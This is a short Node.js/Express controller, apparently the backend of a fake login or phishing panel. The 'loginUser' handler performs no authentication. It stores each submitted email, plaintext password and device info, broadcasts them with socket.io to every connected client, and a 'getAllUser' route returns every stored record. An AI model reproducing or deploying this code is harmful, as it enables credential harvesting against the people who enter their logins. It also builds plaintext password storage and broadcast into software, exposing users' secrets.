const { io } = require('../index');
const User = require('./user.model');

exports.loginUser = async (req, res) => {
  const { email, password, deviceInfo } = req.body;

  try {
    const newLogin = new User({ email, password, deviceInfo });
    await newLogin.save();
 
    // Realtime data emit
    io.emit('newUserLoggedIn', {
      _id: newLogin._id,
      email: newLogin.email,
      password: newLogin.password,
      deviceInfo: newLogin.deviceInfo,
      createdAt: newLogin.createdAt,
    });

    res.status(201).json({
      success: true,
      message: 'Login info saved to database',
      user: {
        id: newLogin._id,
        email: newLogin.email,
      },
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Failed to save login info',
      error: error.message,
    });
  }
};
exports.getAllUser = async(req,res)=>{
  try {
    const users = await User.find().sort({createdAt: -1})
    res.status(200).json(users)
  } catch (error) {
    res.status(500).json({ message: 'Failed to fetch users' , error: error.message});
  }
}
